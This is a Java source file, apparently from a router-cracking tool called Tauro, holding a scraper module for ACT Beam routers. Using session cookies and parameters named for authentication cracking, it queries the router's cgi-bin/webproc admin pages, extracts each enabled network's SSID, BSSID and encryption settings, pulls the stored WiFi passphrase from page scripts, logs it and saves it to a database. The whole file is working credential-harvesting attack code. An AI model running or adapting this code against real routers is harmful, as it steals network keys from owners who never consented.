/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.scraper.formauth;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.tauro.cli.dao.UpdaterDao;
import org.koreops.tauro.cli.scraper.AbstractScrapperAndSaver;
import org.koreops.tauro.core.loggers.Logger;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Scraper module for ACT Beam routers.
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 * @since 26 Sep, 2017 8:24 PM
 */
public class ActBeamScraper extends AbstractScrapperAndSaver {


  public ActBeamScraper(String host, String hostUrl, AuthCrackParams params, UpdaterDao updaterDao) {
    super(host, hostUrl, params, updaterDao);
  }

  @Override
  public boolean scrapeAndLog() {
    return logActBeamWifi();
  }

  private boolean logActBeamWifi() {
    String url = hostUrl + "cgi-bin/webproc";
    try {
      Connection.Response response = Jsoup.connect(url)
          .data(params.getData())
          .headers(params.getHeaders())
          .cookies(params.getCookies())
          .referrer(url)
          .method(Connection.Method.GET)
          .followRedirects(true)
          .execute();

      params.getCookies().putAll(response.cookies());

      //Document doc = Jsoup.connect(response.header("location"))
      //    .cookies(params.getCookies())
      //    .headers(params.getHeaders())
      //    .get();

      Document doc = response.parse();

      if (!(beamTitles.contains(doc.title()))) {
        Logger.debug(host + ": Not a BEAM router. Actual title: " + doc.title());
        return false;
      }

      url = hostUrl + "cgi-bin/webproc";
      params.getData().put("var:page", "wireless_connection");
      doc = Jsoup.connect(url)
          .data("getpage", params.getData().get("getpage"))
          .data("var:menu", params.getData().get("var:menu"))
          .data("var:page", params.getData().get("var:page"))
          .cookies(params.getCookies())
          .headers(params.getHeaders())
          .method(Connection.Method.GET)
          .execute().parse();

      Elements scripts = doc.select("script");

      List<Map<String, String>> wifiDataList = new ArrayList<>();

      for (Element script : scripts) {
        if (script.data().contains("G_Wlan_Info[t][0")) {
          String[] lines = script.data().split("\n");
          int i = 0;
          int g = 1;
          Map<String, String> individualWifiMap = new HashMap<>();
          for (String line : lines) {
            if (line.contains("G_Wlan_Info[t][" + i + "]")) {
              if (i == 1) {
                // 1 is the SSID.
                individualWifiMap.put("SSID", line.substring(line.indexOf("\"") + 1, line.lastIndexOf("\"")));
              } else if (i == 2) {
                // 2 has the BSSID.
                individualWifiMap.put("BSSID", line.substring(line.indexOf("\"") + 1, line.lastIndexOf("\"")).toLowerCase());
              } else if (i == 3) {
                // 3 is encryption.
                individualWifiMap.put("Encryption", line.substring(line.indexOf("\"") + 1, line.lastIndexOf("\"")));
              } else if (i == 5) {
                // 5 specifies if BSSID is enabled.
                String enabled = line.substring(line.indexOf("\"") + 1, line.lastIndexOf("\""));
                if (!"1".equals(enabled)) {
                  // Disabled. No point logging.
                  individualWifiMap.clear();
                }
              } else if (i == 6) {
                // 6 has AuthType for non-WPA.
                if (individualWifiMap.isEmpty()) {
                  // Gotta check as it can be disabled and we'd have removed its entry by now.
                  continue;
                }

                String authtype = line.substring(line.indexOf("\"") + 1, line.lastIndexOf("\""));
                if (!("".equals(authtype) || "None".equals(authtype))) {
                  individualWifiMap.put("AuthType", authtype);
                }
              } else if (i == 7) {
                // 7 has AuthType for WPA.
                if (individualWifiMap.isEmpty()) {
                  // Gotta check as it can be disabled and we'd have removed its entry by now.
                  continue;
                }

                String authtype = line.substring(line.indexOf("\"") + 1, line.lastIndexOf("\""));
                if (!("".equals(authtype) || "None".equals(authtype))) {
                  individualWifiMap.put("AuthType", authtype);
                }
              }
              i++;
              if (i == 8) {
                i = 0;
                if (!individualWifiMap.isEmpty()) {
                  individualWifiMap.put("index", String.valueOf(g));
                  wifiDataList.add(individualWifiMap);
                  individualWifiMap = new HashMap<>();
                }
                g++;
              }
            }
          }
        }
      }

      if (wifiDataList.isEmpty()) {
        // No fucking WiFi enabled.
        return false;
      }

      for (Map<String, String> individualWifiMap : wifiDataList) {
        params.getData().put("var:ssidIndex", individualWifiMap.get("index"));
        params.getData().put("var:menu", "wireless");
        params.getData().put("var:page", "multi_ssid");
        params.getData().put("var:index", individualWifiMap.get("index"));
        params.getData().put("var:subpage", "wireless_security");
        doc = Jsoup.connect(url)
            .data("var:ssidIndex", params.getData().get("var:ssidIndex"))
            .data("getpage", params.getData().get("getpage"))
            .data("var:menu", params.getData().get("var:menu"))
            .data("var:page", params.getData().get("var:page"))
            .data("var:index", params.getData().get("var:index"))
            .data("var:subpage", params.getData().get("var:subpage"))
            .cookies(params.getCookies())
            .headers(params.getHeaders())
            .method(Connection.Method.GET)
            .execute().parse();

        scripts = doc.select("script");
        for (Element script : scripts) {
          if (script.data().contains("var G_KeyPassphrase = ")) {
            String[] lines = script.data().split("\n");
            for (String line : lines) {
              if (line.contains("var G_KeyPassphrase = ")) {
                individualWifiMap.put("key", line.substring(line.indexOf("= \"") + 3, line.lastIndexOf("\"")));
                Logger.info(host + ": Found key: " + individualWifiMap.get("key"));
              }
            }
          }
        }
      }

      for (Map<String, String> wifiData : wifiDataList) {
        Logger.debug(host + ": Found MAC: " + wifiData.get("BSSID"));
        Logger.info(host + ": Found SSID: " + wifiData.get("SSID"));
        Logger.info(host + ": Found AuthType: " + wifiData.get("AuthType"));
        Logger.info(host + ": Found Encryption: " + wifiData.get("Encryption"));
        updaterDao.saveStation(wifiData, host);
      }

      return true;

    } catch (IOException e) {
      Logger.error(host + ": " + e.getMessage());
      e.printStackTrace();
    }

    return  false;
  }
}
